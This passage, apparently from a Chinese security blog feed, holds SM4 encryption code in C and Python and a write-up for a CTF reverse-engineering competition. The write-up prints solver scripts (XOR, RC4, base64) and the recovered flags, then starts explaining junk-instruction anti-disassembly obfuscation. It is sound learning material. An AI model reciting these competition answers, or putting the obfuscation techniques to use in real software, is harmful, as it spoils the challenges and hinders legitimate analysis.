0xd4,0x00,0x46,0x57,0x9f,0xd3,0x27,0x52,0x4c,0x36,0x02,0xe7,0xa0,0xc4,0xc8,0x9e,    0xea,0xbf,0x8a,0xd2,0x40,0xc7,0x38,0xb5,0xa3,0xf7,0xf2,0xce,0xf9,0x61,0x15,0xa1,    0xe0,0xae,0x5d,0xa4,0x9b,0x34,0x1a,0x55,0xad,0x93,0x32,0x30,0xf5,0x8c,0xb1,0xe3,    0x1d,0xf6,0xe2,0x2e,0x82,0x66,0xca,0x60,0xc0,0x29,0x23,0xab,0x0d,0x53,0x4e,0x6f,    0xd5,0xdb,0x37,0x45,0xde,0xfd,0x8e,0x2f,0x03,0xff,0x6a,0x72,0x6d,0x6c,0x5b,0x51,    0x8d,0x1b,0xaf,0x92,0xbb,0xdd,0xbc,0x7f,0x11,0xd9,0x5c,0x41,0x1f,0x10,0x5a,0xd8,    0x0a,0xc1,0x31,0x88,0xa5,0xcd,0x7b,0xbd,0x2d,0x74,0xd0,0x12,0xb8,0xe5,0xb4,0xb0,    0x89,0x69,0x97,0x4a,0x0c,0x96,0x77,0x7e,0x65,0xb9,0xf1,0x09,0xc5,0x6e,0xc6,0x84,    0x18,0xf0,0x7d,0xec,0x3a,0xdc,0x4d,0x20,0x79,0xee,0x5f,0x3e,0xd7,0xcb,0x39,0x48&#125;;void long_to_char(unsigned int in ,unsigned char *out)&#123;    int i;    for(i=0;i&lt;4;i++)    &#123;        out[i]=(unsigned char)(in&gt;&gt;(24-i*8))&amp;0xff;    &#125;&#125;void char_to_long(unsigned char *in , unsigned int *out)&#123;    int i;    *out=0;    for(i=0;i&lt;4;i++)    &#123;        *out = (unsigned int)in[i]&lt;&lt;(24-8*i)|(*out);    &#125;&#125;unsigned int left_move(unsigned int a,int lenth)&#123;    a=(a&lt;&lt;lenth) | a&gt;&gt;(32-lenth);    return a;&#125;unsigned int date_round(unsigned int tmp)&#123;    int i;    unsigned char arr[4]=&#123;0&#125;;    long_to_char(tmp,arr);    for(i=0;i&lt;4;i++)    &#123;        arr[i]=SBOX[arr[i]];    &#125;    char_to_long(arr,&amp;tmp);    tmp = tmp ^ left_move(tmp, 2) ^ left_move(tmp, 10) ^ left_move(tmp, 18) ^ left_move(tmp, 24);    return tmp;&#125;void sm4_encode(unsigned char *plain,unsigned int sub_key[],unsigned char out[])&#123;    int i;    unsigned int date[36];    for(i=0;i&lt;4;i++)    &#123;        char_to_long(plain+i*4,date+i);    &#125;    for(i=0;i&lt;32;i++)    &#123;        date[i+4]=date[i]^date_round(date[i+1]^date[i+2]^date[i+3]^sub_key[i+4]);    &#125;    for(i=0;i&lt;4;i++)    &#123;        long_to_char(date[35-i],out+i*4);    &#125;&#125;void sm4_decode(unsigned char *code,unsigned int sub_key[],unsigned char out[])&#123;    int i;    unsigned int date[36];    for(i=0;i&lt;4;i++)    &#123;        char_to_long(code+i*4,date+i);    &#125;    for(i=0;i&lt;32;i++)    &#123;        date[i+4]=date[i]^date_round(date[i+1]^date[i+2]^date[i+3]^sub_key[35-i]);    &#125;    for(i=0;i&lt;4;i++)    &#123;        long_to_char(date[35-i],out+i*4);    &#125;&#125;unsigned int key_round(unsigned int tmp)&#123;    int i;    unsigned char arr[4]=&#123;0&#125;;    long_to_char(tmp,arr);    for(i=0;i&lt;4;i++)    &#123;        arr[i]=SBOX[arr[i]];    &#125;    char_to_long(arr,&amp;tmp);    tmp = tmp ^ left_move(tmp, 13) ^ left_move(tmp, 23);    return tmp;&#125;void extendkey(unsigned char key[],unsigned int sub_key[])&#123;    int i;    for(i=0;i&lt;4;i++)    &#123;        char_to_long(key+i*4,sub_key+i);        sub_key[i]^=FK[i];    &#125;    for(i=0;i&lt;32;i++)    &#123;        sub_key[i+4]=sub_key[i] ^ key_round(sub_key[i+1] ^ sub_key[i+2] ^ sub_key[i+3] ^ CK[i]);    &#125;&#125;int main(void)&#123;    unsigned char key[16] = &#123;0x01,0x23,0x45,0x67,0x89,0xab,0xcd,0xef,0xfe,0xdc,0xba,0x98,0x76,0x54,0x32,0x10&#125;;    unsigned char code[16]=&#123;0x68,0x1e,0xdf,0x34,0xd2,0x06,0x96,0x5e,0x86,0xb3,0xe9,0x4f,0x53,0x6e,0x42,0x46&#125;;    unsigned char plain[16]=&#123;0x01,0x23,0x45,0x67,0x89,0xab,0xcd,0xef,0xfe,0xdc,0xba,0x98,0x76,0x54,0x32,0x10&#125;;    unsigned int sub_key[36]=&#123;0&#125;;        unsigned char out[16];    int i;    extendkey(key,sub_key);    sm4_encode(plain,sub_key,out);    for(i=0;i&lt;16;i++)    &#123;        printf(&quot;0x%02x,&quot;,out[i]);    &#125;    printf(&quot;\n&quot;);    sm4_decode(code,sub_key,out);    for(i=0;i&lt;16;i++)    &#123;        printf(&quot;0x%02x,&quot;,out[i]);    &#125; &#125; </code></pre><p>网上的python版本</p><pre><code>SBOX = [&#39;d6&#39;, &#39;90&#39;, &#39;e9&#39;, &#39;fe&#39;, &#39;cc&#39;, &#39;e1&#39;, &#39;3d&#39;, &#39;b7&#39;, &#39;16&#39;, &#39;b6&#39;, &#39;14&#39;, &#39;c2&#39;, &#39;28&#39;, &#39;fb&#39;, &#39;2c&#39;, &#39;05&#39;,       &#39;2b&#39;, &#39;67&#39;, &#39;9a&#39;, &#39;76&#39;, &#39;2a&#39;, &#39;be&#39;, &#39;04&#39;, &#39;c3&#39;, &#39;aa&#39;, &#39;44&#39;, &#39;13&#39;, &#39;26&#39;, &#39;49&#39;, &#39;86&#39;, &#39;06&#39;, &#39;99&#39;,       &#39;9c&#39;, &#39;42&#39;, &#39;50&#39;, &#39;f4&#39;, &#39;91&#39;, &#39;ef&#39;, &#39;98&#39;, &#39;7a&#39;, &#39;33&#39;, &#39;54&#39;, &#39;0b&#39;, &#39;43&#39;, &#39;ed&#39;, &#39;cf&#39;, &#39;ac&#39;, &#39;62&#39;,       &#39;e4&#39;, &#39;b3&#39;, &#39;1c&#39;, &#39;a9&#39;, &#39;c9&#39;, &#39;08&#39;, &#39;e8&#39;, &#39;95&#39;, &#39;80&#39;, &#39;df&#39;, &#39;94&#39;, &#39;fa&#39;, &#39;75&#39;, &#39;8f&#39;, &#39;3f&#39;, &#39;a6&#39;,       &#39;47&#39;, &#39;07&#39;, &#39;a7&#39;, &#39;fc&#39;, &#39;f3&#39;, &#39;73&#39;, &#39;17&#39;, &#39;ba&#39;, &#39;83&#39;, &#39;59&#39;, &#39;3c&#39;, &#39;19&#39;, &#39;e6&#39;, &#39;85&#39;, &#39;4f&#39;, &#39;a8&#39;,       &#39;68&#39;, &#39;6b&#39;, &#39;81&#39;, &#39;b2&#39;, &#39;71&#39;, &#39;64&#39;, &#39;da&#39;, &#39;8b&#39;, &#39;f8&#39;, &#39;eb&#39;, &#39;0f&#39;, &#39;4b&#39;, &#39;70&#39;, &#39;56&#39;, &#39;9d&#39;, &#39;35&#39;,       &#39;1e&#39;, &#39;24&#39;, &#39;0e&#39;, &#39;5e&#39;, &#39;63&#39;, &#39;58&#39;, &#39;d1&#39;, &#39;a2&#39;, &#39;25&#39;, &#39;22&#39;, &#39;7c&#39;, &#39;3b&#39;, &#39;01&#39;, &#39;21&#39;, &#39;78&#39;, &#39;87&#39;,       &#39;d4&#39;, &#39;00&#39;, &#39;46&#39;, &#39;57&#39;, &#39;9f&#39;, &#39;d3&#39;, &#39;27&#39;, &#39;52&#39;, &#39;4c&#39;, &#39;36&#39;, &#39;02&#39;, &#39;e7&#39;, &#39;a0&#39;, &#39;c4&#39;, &#39;c8&#39;, &#39;9e&#39;,       &#39;ea&#39;, &#39;bf&#39;, &#39;8a&#39;, &#39;d2&#39;, &#39;40&#39;, &#39;c7&#39;, &#39;38&#39;, &#39;b5&#39;, &#39;a3&#39;, &#39;f7&#39;, &#39;f2&#39;, &#39;ce&#39;, &#39;f9&#39;, &#39;61&#39;, &#39;15&#39;, &#39;a1&#39;,       &#39;e0&#39;, &#39;ae&#39;, &#39;5d&#39;, &#39;a4&#39;, &#39;9b&#39;, &#39;34&#39;, &#39;1a&#39;, &#39;55&#39;, &#39;ad&#39;, &#39;93&#39;, &#39;32&#39;, &#39;30&#39;, &#39;f5&#39;, &#39;8c&#39;, &#39;b1&#39;, &#39;e3&#39;,       &#39;1d&#39;, &#39;f6&#39;, &#39;e2&#39;, &#39;2e&#39;, &#39;82&#39;, &#39;66&#39;, &#39;ca&#39;, &#39;60&#39;, &#39;c0&#39;, &#39;29&#39;, &#39;23&#39;, &#39;ab&#39;, &#39;0d&#39;, &#39;53&#39;, &#39;4e&#39;, &#39;6f&#39;,       &#39;d5&#39;, &#39;db&#39;, &#39;37&#39;, &#39;45&#39;, &#39;de&#39;, &#39;fd&#39;, &#39;8e&#39;, &#39;2f&#39;, &#39;03&#39;, &#39;ff&#39;, &#39;6a&#39;, &#39;72&#39;, &#39;6d&#39;, &#39;6c&#39;, &#39;5b&#39;, &#39;51&#39;,       &#39;8d&#39;, &#39;1b&#39;, &#39;af&#39;, &#39;92&#39;, &#39;bb&#39;, &#39;dd&#39;, &#39;bc&#39;, &#39;7f&#39;, &#39;11&#39;, &#39;d9&#39;, &#39;5c&#39;, &#39;41&#39;, &#39;1f&#39;, &#39;10&#39;, &#39;5a&#39;, &#39;d8&#39;,       &#39;0a&#39;, &#39;c1&#39;, &#39;31&#39;, &#39;88&#39;, &#39;a5&#39;, &#39;cd&#39;, &#39;7b&#39;, &#39;bd&#39;, &#39;2d&#39;, &#39;74&#39;, &#39;d0&#39;, &#39;12&#39;, &#39;b8&#39;, &#39;e5&#39;, &#39;b4&#39;, &#39;b0&#39;,       &#39;89&#39;, &#39;69&#39;, &#39;97&#39;, &#39;4a&#39;, &#39;0c&#39;, &#39;96&#39;, &#39;77&#39;, &#39;7e&#39;, &#39;65&#39;, &#39;b9&#39;, &#39;f1&#39;, &#39;09&#39;, &#39;c5&#39;, &#39;6e&#39;, &#39;c6&#39;, &#39;84&#39;,       &#39;18&#39;, &#39;f0&#39;, &#39;7d&#39;, &#39;ec&#39;, &#39;3a&#39;, &#39;dc&#39;, &#39;4d&#39;, &#39;20&#39;, &#39;79&#39;, &#39;ee&#39;, &#39;5f&#39;, &#39;3e&#39;, &#39;d7&#39;, &#39;cb&#39;, &#39;39&#39;, &#39;48&#39;,]FK = [&#39;a3b1bac6&#39;, &#39;56aa3350&#39;, &#39;677d9197&#39;, &#39;b27022dc&#39;]CK = [&#39;00070e15&#39;, &#39;1c232a31&#39;, &#39;383f464d&#39;, &#39;545b6269&#39;,      &#39;70777e85&#39;, &#39;8c939aa1&#39;, &#39;a8afb6bd&#39;, &#39;c4cbd2d9&#39;,      &#39;e0e7eef5&#39;, &#39;fc030a11&#39;, &#39;181f262d&#39;, &#39;343b4249&#39;,      &#39;50575e65&#39;, &#39;6c737a81&#39;, &#39;888f969d&#39;, &#39;a4abb2b9&#39;,      &#39;c0c7ced5&#39;, &#39;dce3eaf1&#39;, &#39;f8ff060d&#39;, &#39;141b2229&#39;,      &#39;30373e45&#39;, &#39;4c535a61&#39;, &#39;686f767d&#39;, &#39;848b9299&#39;,      &#39;a0a7aeb5&#39;, &#39;bcc3cad1&#39;, &#39;d8dfe6ed&#39;, &#39;f4fb0209&#39;,      &#39;10171e25&#39;, &#39;2c333a41&#39;, &#39;484f565d&#39;, &#39;646b7279&#39;]def left(list,n):    return list[n:] + list[:n]def group(list, n):    for i in range(0, len(list), n):        yield list[i:i + n]def xor(a,b):    a1 = int(a,16)    b1 = int(b,16)    if a == b:        A = &#39;&#123;:032x&#125;&#39;.format(int(a1^b1))    else:        A = &#39;&#123;:08x&#125;&#39;.format(int(a1^b1))    return Adef round_function(k0,k1,k2,k3,rk,mod):    k = xor(xor(xor(k1,k2),k3),rk)    Tr = T(k,mod)    rki = xor(k0,Tr)    return rkidef T(A,mod):    T = linear(S(A),mod)    return Tdef S(A):    A1 = []    A2 = [0,0,0,0]    for i in group(A,2):        A1.append(i)    for i in range(4):        l = int(A1[i],16)        A2[i] = &#39;&#123;:02x&#125;&#39;.format(int(SBOX[l],16))     A2 = &#39;&#39;.join(A2)    return A2def linear(B,mod):    B1 = list(B)    for i in range(8):        B1[i] = &#39;&#123;:04b&#125;&#39;.format(int(B1[i],16))    B1 = &#39;&#39;.join(B1)    B1_2= left(B1,2)    B1_10 = left(B1,10)    B1_18 = left(B1,18)    B1_24 = left(B1,24)    B1_13 = left(B1,13)    B1_23 = left(B1,23)    if mod == &#39;enc&#39; or mod ==  &#39;dec&#39;:        BX = xor(xor(xor(xor(B1,B1_2),B1_10),B1_18),B1_24)    elif mod == &#39;extend&#39;:        BX = xor(xor(B1,B1_13),B1_23)    else:        return &quot;模式输入错误&quot;    BX = &#39;%x&#39;%int(BX, 2)    return BXdef get_key(key):    MK = []    for i in group(key,8):        MK.append(i)    key0 = xor(MK[0],FK[0])    key1 = xor(MK[1],FK[1])    key2 = xor(MK[2],FK[2])    key3 = xor(MK[3],FK[3])    keylist = [key0,key1,key2,key3]    rk = []    for i in range(32):        a = round_function(keylist[i],keylist[i+1],keylist[i+2],keylist[i+3],CK[i],mod=&#39;extend&#39;)        keylist.append(a)        rk.append(a)    return rkdef get_sm4_ecb(key,input_data,mod):    data = []    rk = get_key(key)    for i in group(input_data,8):        data.append(i)    for i in range(32):        if mod == &#39;enc&#39;:            ldata = round_function(data[i],data[i+1],data[i+2],data[i+3],rk[i],mod)        else:            ldata = round_function(data[i],data[i+1],data[i+2],data[i+3],rk[31-i],mod)        data.append(ldata)    out_data = [data[35],data[34],data[33],data[32]]    out_data = &#39;&#39;.join(out_data)    return out_datadef get_sm4_cbc(key,input_data,iv,mod):    rk = get_key(key)    if mod == &#39;enc&#39;:        input_data = xor(input_data,iv)        data = []        for i in group(input_data,8):            data.append(i)        for i in range(32):            ldata = round_function(data[i],data[i+1],data[i+2],data[i+3],rk[i],mod)            data.append(ldata)        out_data = [data[35],data[34],data[33],data[32]]        out_data = &#39;&#39;.join(out_data)    else:        data = []        for i in group(input_data,8):            data.append(i)        for i in range(32):            ldata = round_function(data[i],data[i+1],data[i+2],data[i+3],rk[31-i],mod)            data.append(ldata)        out_data = [data[35],data[34],data[33],data[32]]        out_data = &#39;&#39;.join(out_data)        out_data = xor(out_data,iv)        out_data = &#39;&#123;:032x&#125;&#39;.format(int(out_data, 16))    return out_dataprint(get_sm4_ecb(key = &#39;0123456789abcdeffedcba9876543210&#39;, input_data = &#39;0123456789abcdeffedcba9876543210&#39;, mod = &#39;enc&#39;))print(get_sm4_ecb(key = &#39;0123456789abcdeffedcba9876543210&#39;, input_data = &#39;681edf34d206965e86b3e94f536e4246&#39;, mod = &#39;dec&#39;))print(get_sm4_cbc(key = &#39;0123456789abcdeffedcba9876543210&#39;, input_data = &#39;681edf34d206965e86b3e94f536e4246&#39;,                  iv = &#39;0123456789abcdeffedcba9876543210&#39;, mod=&#39;enc&#39;))print(get_sm4_cbc(key = &#39;0123456789abcdeffedcba9876543210&#39;, input_data = &#39;9ff11dcfd3afaa236c76090babc3bb85&#39;,                  iv = &#39;0123456789abcdeffedcba9876543210&#39;, mod=&#39;dec&#39;))</code></pre><h2 id="BlowFish"><a href="#BlowFish" class="headerlink" title="BlowFish"></a>BlowFish</h2><p><a href="https://www.cnblogs.com/iBinary/p/14883752.html">https://www.cnblogs.com/iBinary/p/14883752.html</a></p><h1 id="非对称加密"><a href="#非对称加密" class="headerlink" title="非对称加密"></a>非对称加密</h1><h2 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h2>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>鹏程实验室邀请赛wp</title>
      <link href="2021/01/16/%E9%B9%8F%E7%A8%8B%E5%AE%9E%E9%AA%8C%E5%AE%A4%E9%82%80%E8%AF%B7%E8%B5%9Bwp/"/>
      <url>2021/01/16/%E9%B9%8F%E7%A8%8B%E5%AE%9E%E9%AA%8C%E5%AE%A4%E9%82%80%E8%AF%B7%E8%B5%9Bwp/</url>
      
        <content type="html"><![CDATA[<h1 id="鹏程实验室邀请赛"><a href="#鹏程实验室邀请赛" class="headerlink" title="鹏程实验室邀请赛"></a>鹏程实验室邀请赛</h1><p>简介：部分题的wp，总结一些没见过的一些知识点吧。</p><h2 id="1-base64-32"><a href="#1-base64-32" class="headerlink" title="1.base64+32"></a>1.base64+32</h2><p>文件是个html文件，打开</p><pre><code>LJWXQ2C2PFKTGULKLEZE6RCKNBNEIRTMJRKFC6SZGJGXITSEIEZFUQZRNBNGUQLZJRKFE2SOPJNGYWTKLEYFUV2JGJHFGVJTKJAT2PI=</code></pre><p>先进行base32解码，在进行base64解码，得到</p><pre><code>flag%7B6682ad1e-43cc-406d-af02-4c76ef64eb65%7D</code></pre><p>看起有点像，开始不知道URL编码，交flag一直不对，试了几次，终于对了。</p><pre><code>flag&#123;6682ad1e-43cc-406d-af02-4c76ef64eb65&#125;</code></pre><p>URL编码表<a href="https://blog.csdn.net/sinat_34439107/article/details/78242584">https://blog.csdn.net/sinat_34439107/article/details/78242584</a></p><h2 id="2-cpp"><a href="#2-cpp" class="headerlink" title="2.cpp"></a>2.cpp</h2><p>IDA打开，找到关键代码</p><pre><code>int __cdecl main(int argc, const char **argv, const char **envp)&#123;  __int64 v3; // rax  __int64 v4; // rax  _BYTE *v5; // rbx  char v6; // r12  __int64 v7; // rax  int v9; // [rsp+Ch] [rbp-E4h]  __int64 v10[2]; // [rsp+10h] [rbp-E0h] BYREF  __int64 v11[2]; // [rsp+20h] [rbp-D0h] BYREF  char v12[32]; // [rsp+30h] [rbp-C0h] BYREF  char v13[32]; // [rsp+50h] [rbp-A0h] BYREF  char v14[32]; // [rsp+70h] [rbp-80h] BYREF  int v15[18]; // [rsp+90h] [rbp-60h]  unsigned __int64 v16; // [rsp+D8h] [rbp-18h]  v16 = __readfsqword(0x28u);  std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::basic_string(v13, argv, envp);  v3 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Please input flag:&quot;);  std::ostream::operator&lt;&lt;(v3, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);  std::operator&gt;&gt;&lt;char&gt;(&amp;std::cin, v13);//输入的flag，v13  if ( std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::length(v13) != 16 )//长度为16  &#123;    v4 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;length error&quot;);    std::ostream::operator&lt;&lt;(v4, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);    exit(0);  &#125;  v15[0] = 18;  v15[1] = 19;  v15[2] = 20;  v15[3] = 22;  v15[4] = 18;  v15[5] = 17;  v15[6] = 18;  v15[7] = 19;  v15[8] = 20;  v15[9] = 22;  v15[10] = 18;  v15[11] = 17;  v15[12] = 17;  v15[13] = 18;  v15[14] = 18;  v15[15] = 24;  std::allocator&lt;int&gt;::allocator(v10);  LODWORD(v11[0]) = 0;  std::vector&lt;int&gt;::vector(v12, 16LL, v11, v10);  std::allocator&lt;int&gt;::~allocator(v10);  v9 = 0;//相当于循环里面的i。  __gnu_cxx::__normal_iterator&lt;int *,std::vector&lt;int&gt;&gt;::__normal_iterator(v10);  v10[0] = std::vector&lt;int&gt;::begin(v12);  while ( 1 )  &#123;    v11[0] = std::vector&lt;int&gt;::end(v12);    if ( !(unsigned __int8)__gnu_cxx::operator!=&lt;int *,std::vector&lt;int&gt;&gt;(v10, v11) )      break;    *(_DWORD *)__gnu_cxx::__normal_iterator&lt;int *,std::vector&lt;int&gt;&gt;::operator*(v10) = v15[v9];    std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::substr(v14, v13, v9, 1LL);//这里是c++里面的复制字符串函数，相当于strcmp，将v13给了v14。    std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::operator[](v14, 0LL);    v5 = (_BYTE *)std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::operator[](v13, v9);    v6 = *(_BYTE *)std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::operator[](v14, 0LL);    *v5 = v6 ^ *(_DWORD *)__gnu_cxx::__normal_iterator&lt;int *,std::vector&lt;int&gt;&gt;::operator*(v10);//这里就是那个异或，相当于flag[i]=flag[i]^v15[i]    ++v9;    std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::~basic_string(v14);    __gnu_cxx::__normal_iterator&lt;int *,std::vector&lt;int&gt;&gt;::operator++(v10);  &#125;  if ( (unsigned int)std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::compare(                       (__int64)v13,                       (__int64)&amp;enc[abi:cxx11]) )//这里是比较函数，只不过好像不能直接看到加密后的内容。    v7 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;try again :(&quot;);  else    v7 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Good,you got it,flag is flag&#123;your input&#125;&quot;);  std::ostream::operator&lt;&lt;(v7, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);  std::vector&lt;int&gt;::~vector(v12);  std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::~basic_string(v13);  return 0;&#125;</code></pre><p>就是一个异或，然后最后那个密文好像要通过动调得到，但是在ida的字符串窗口也可以找到(只是可能你不知道那是密文)。然后写脚本。</p><pre><code>#include&lt;stdio.h&gt; int main(void)&#123;    int flag[16]=&#123;&#39;#&#39;, &#39;!&#39;, 0x27, &#39;&quot;&#39;, 0x27, 0x27, &#39;%&#39;, &#39;+&#39;, &#39;-&#39;, &#39;&amp;&#39;, &#39;#&#39;, &#39;#&#39;,&#39;&quot;&#39;, &#39;&amp;&#39;, 0x27, &#39;.&#39;&#125;;    int i;    int v15[16]=&#123;18,19,20,22,18,17,18,19,20,22,18,17,17,18,18,24&#125;;    for(i=0;i&lt;16;i++)    &#123;        flag[i]=flag[i]^v15[i];        printf(&quot;%c&quot;,flag[i]);    &#125;&#125;</code></pre><p>得到<br>    flag{12334567890123456}</p><h2 id="3-crypto"><a href="#3-crypto" class="headerlink" title="3.crypto"></a>3.crypto</h2><p>这道题主要考了rc4，以后会整理一篇关于一些加密算法的博客，解这道题可以参考<a href="https://baike.baidu.com/item/RC4/3454548?fr=aladdin" title="rc4 百度百科">https://baike.baidu.com/item/RC4/3454548?fr=aladdin</a>，我认为这道题就用的里面的代码。</p><p>ida打开，找到关键代码<br><img src="https://i.loli.net/2021/01/16/A7YWBOElqJc6HQ3.png"><br>先用python进行base64解码。</p><pre><code>import base64url = &quot;x1H/EcYUm448LIIVkU3p1hKzOQHegw==&quot;str_url = base64.b64decode(url)print(str_url)</code></pre><p>得到’\xc7Q\xff\x11\xc6\x14\x9b\x8e&lt;,\x82\x15\x91M\xe9\xd6\x12\xb39\x01\xde\x83’</p><p>然后在rc4解密</p><pre><code>#include&lt;stdio.h&gt;#include&lt;string.h&gt;#include &lt;wchar.h&gt;typedef unsigned longULONG;/*初始化函数*/void rc4_init(unsigned char*s, unsigned char*key, unsigned long Len)&#123;    int i = 0, j = 0;    char k[256] = &#123; 0 &#125;;    unsigned char tmp = 0;    for (i = 0; i&lt;256; i++)    &#123;        s[i] = i;        k[i] = key[i%Len];    &#125;    for (i = 0; i&lt;256; i++)    &#123;        j = (j + s[i] + k[i]) % 256;        tmp = s[i];        s[i] = s[j];//交换s[i]和s[j]        s[j] = tmp;    &#125;&#125;/*加解密*/void rc4_crypt(unsigned char*s, unsigned char*Data, unsigned long Len)&#123;    int i = 0, j = 0, t = 0;    unsigned long k = 0;    unsigned char tmp;    for (k = 0; k&lt;Len; k++)    &#123;        i = (i + 1) % 256;        j = (j + s[i]) % 256;        tmp = s[i];        s[i] = s[j];//交换s[x]和s[y]        s[j] = tmp;        t = (s[i] + s[j]) % 256;        Data[k] ^= s[t];    &#125;&#125;int main()&#123;    unsigned char s[256] = &#123; 0 &#125;, s2[256] = &#123; 0 &#125;;//S-box    char key[256] =&quot;i_am_3_key&quot;;    char pData[256] = &#123;&#39;\xc7&#39;, &#39;Q&#39;, &#39;\xff&#39;, &#39;\x11&#39;, &#39;\xc6&#39;, &#39;\x14&#39;, &#39;\x9b&#39;, &#39;\x8e&#39;, &#39;&lt;&#39;, &#39;,&#39;, &#39;\x82&#39;, &#39;\x15&#39;, &#39;\x91&#39;, &#39;M&#39;, &#39;\xe9&#39;, &#39;\xd6&#39;, &#39;\x12&#39;, &#39;\xb3&#39;, &#39;9&#39;, &#39;\x01&#39;, &#39;\xde&#39;, &#39;\x83&#39;&#125;;    unsigned long len = strlen(pData);    int i;    printf(&quot;pData=%s\n&quot;, pData);    printf(&quot;key=%s,length=%d\n\n&quot;, key, strlen(key));    rc4_init(s, (unsigned char*)key, strlen(key));//已经完成了初始化    printf(&quot;\n&quot;);    for (i = 0; i&lt;256; i++)//用s2[i]暂时保留经过初始化的s[i]，很重要的！！！    &#123;        s2[i] = s[i];    &#125;    rc4_crypt(s2, (unsigned char*)pData, len);//解密    printf(&quot;pData=%s\n\n&quot;, pData);    return 0;&#125;</code></pre><p>得到</p><pre><code>flag&#123;rc4_is_very_easy&#125;</code></pre><h2 id="4-apk"><a href="#4-apk" class="headerlink" title="4.apk"></a>4.apk</h2><p>jeb打开，就是一个简单的异或，写出脚本</p><pre><code>#include&lt;stdio.h&gt;int main(void)&#123;    int a[42]=&#123;0x71, 0x7B, 0x76, 0x70, 108, 0x20, 34, 46, 0x71, 0x71, 0x74, 0x72, 0x75, 58, 33, 34, 0x74, 0x73, 58, 35, 46, 34, 33, 58, 46, 0x74, 0x71, 39, 58, 35, 0x71, 0x20, 0x75, 37, 0x72, 36, 0x74, 38, 0x74, 36, 36, 106&#125;;     int i;    for(i=0;i&lt;42;i++)    &#123;        a[i]=a[i]^23;        printf(&quot;%c&quot;,a[i]);    &#125; &#125; </code></pre><p>得到</p><pre><code>flag&#123;759ffceb-65cd-4956-9cf0-4f7b2e3c1c33&#125;</code></pre><h2 id="5-apk2"><a href="#5-apk2" class="headerlink" title="5.apk2"></a>5.apk2</h2><p>文件下载下来用jeb打开，然后搜索字符串，找到关键代码<br><img src="https://i.loli.net/2021/01/16/KfqTApF9zN8htG1.png"><br>然后去找密文<br><img src="https://i.loli.net/2021/01/16/Jbvet8fXQxMmlNB.png"><br>得到name=enc，然后去resources/values/sting.xml里面找到enc的值，这里有两种方法，第一种是直接在jeb里面找，第二种是用apktool将apk解包，在解包文件中找，这里只写第一种方法。<br><img src="https://i.loli.net/2021/01/16/3kSHiRbF1uyXEA8.png"><br>第二种方法，就给两个链接，<a href="https://blog.csdn.net/qq_27292113/article/details/79931268" title="下载apktool">https://blog.csdn.net/qq_27292113/article/details/79931268</a>，<a href="https://www.cnblogs.com/QKSword/p/8184997.html" title="用apktool解包">https://www.cnblogs.com/QKSword/p/8184997.html</a></p><pre><code>java -jar .\apktool_2.3.0.jar d .\app-debug.apk -o QKSword//解包命令</code></pre><p>注意需要先将enc倒序得到ZmxhZ3s1MmU2YjBiZi00OGY4LTQ5ZDItOTBmYi04NWI0ZWIxOGFlNTR9，然后base64解密得到</p><pre><code>flag&#123;52e6b0bf-48f8-49d2-90fb-85b4eb18ae54&#125;</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>逆向之&quot;花&quot;</title>
      <link href="2020/12/18/%E8%8A%B1%E6%8C%87%E4%BB%A4/"/>
      <url>2020/12/18/%E8%8A%B1%E6%8C%87%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h1 id="花指令"><a href="#花指令" class="headerlink" title="花指令"></a>花指令</h1><h2 id="一、花指令概述"><a href="#一、花指令概述" class="headerlink" title="一、花指令概述"></a>一、花指令概述</h2><p>1.概念：花指令是，由设计者特别构思，希望使静态反汇编的时候出错，让破解者无法清楚正确地反汇编程序的内容，迷失方向。</p><p>2.分类：分为可执行式与不可执行式</p><p>可执行式：就是能够执行这些花指令，但执行这些代码没有任何意义，执行前后不改变任何寄存器的值(当然eip这种除外)，同时这部分代码也会被反汇编器正常识别。</p><p>这种花指令的目的就是：</p><p>(1)增大逆向者的工作量，可能一串代码看了很久，到最后分析出来没有任何用处。</p><p>(2)然后，这种花指令可以破坏反编译的分析,使得栈指针在反编译引擎中出现异常例如</p><pre><code>sub_411880      endp ; sp-analysis failed</code></pre><p>不可执行类：是这部分花指令代码在程序的正常执行过程中不会被执行</p><p>目的：</p><p>就是会导致在IDA里面查看是看到一些不正确的汇编指令</p><p>3.实现原理：或者说是为什么加了某些花指令，就会反编译不了，主要还是因为，一些反编译工具，如IDA采用的是线性反编译。文件都是二进制构成的，一部分二进制转换为十六进制，就是所谓的机器码，而机器码就可以转换为对应的汇编指令，如</p><pre><code>55就相当于push ebp8B EC就相当于mov ebp,espE8 